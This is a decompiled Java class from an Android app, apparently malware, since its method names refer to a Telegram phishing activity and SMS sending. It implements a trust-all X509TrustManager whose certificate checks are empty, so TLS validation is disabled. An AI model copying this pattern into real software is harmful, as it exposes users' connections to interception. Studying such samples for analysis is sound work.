package com.base.template.network;

import java.security.cert.X509Certificate;
import javax.net.ssl.X509TrustManager;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class SmsFastSend$trustManager$1 implements X509TrustManager {
    public final /* synthetic */ int $r8$classId;

    private final void checkClientTrusted$com$base$template$TelegramPhishActivity$doPost$trustManager$1(X509Certificate[] x509CertificateArr, String str) {
    }

    private final void checkClientTrusted$com$base$template$network$SmsFastSend$trustManager$1(X509Certificate[] x509CertificateArr, String str) {
    }

    private final void checkClientTrusted$com$base$template$network$WsPersistManager$TrustAllCerts$trustManager$1(X509Certificate[] x509CertificateArr, String str) {
    }

    private final void checkServerTrusted$com$base$template$TelegramPhishActivity$doPost$trustManager$1(X509Certificate[] x509CertificateArr, String str) {
    }

    private final void checkServerTrusted$com$base$template$network$SmsFastSend$trustManager$1(X509Certificate[] x509CertificateArr, String str) {
    }

    private final void checkServerTrusted$com$base$template$network$WsPersistManager$TrustAllCerts$trustManager$1(X509Certificate[] x509CertificateArr, String str) {
    }

    @Override // javax.net.ssl.X509TrustManager
    public final void checkClientTrusted(X509Certificate[] x509CertificateArr, String str) {
        int i = this.$r8$classId;
    }

    @Override // javax.net.ssl.X509TrustManager
    public final void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) {
        int i = this.$r8$classId;
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0002. Please report as an issue. */
    @Override // javax.net.ssl.X509TrustManager
    public final X509Certificate[] getAcceptedIssuers() {
        switch (this.$r8$classId) {
        }
        return new X509Certificate[0];
    }
}
